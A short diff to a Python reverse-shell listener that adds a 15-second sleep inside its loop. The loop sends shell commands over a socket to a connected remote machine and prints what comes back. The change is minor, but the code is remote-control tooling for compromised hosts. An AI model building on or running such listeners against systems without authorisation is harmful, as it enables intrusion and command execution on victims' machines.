@@ -53,6 +53,7 @@ def reverse_shell_listener():
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = recv_timeout(conn) # Receive output from command.
 			print(data) # Print the output of the command.
+		sleep(15)
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
 		exit() # Using [ctrl+c] will terminate the listener.
